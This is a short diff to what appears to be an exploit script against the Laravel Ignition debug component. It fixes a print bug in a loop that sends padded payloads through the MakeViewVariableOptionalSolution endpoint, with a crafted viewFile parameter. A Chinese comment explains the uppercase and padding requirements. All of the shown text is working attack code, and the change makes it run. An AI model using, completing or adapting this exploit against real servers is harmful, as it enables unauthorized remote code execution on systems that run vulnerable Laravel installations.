@@ -53,7 +53,7 @@ _____________   ______________         _______________   ________  ____         
     payload="A"*16+b.upper() #必须大写,添加A作为padding
 
     for i in range(4):
-        print("sending payload no."+i)
+        print("sending payload no."+str(i))
         test_payload=payload[i:]
         # print(test_payload)
         attack_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":test_payload}}
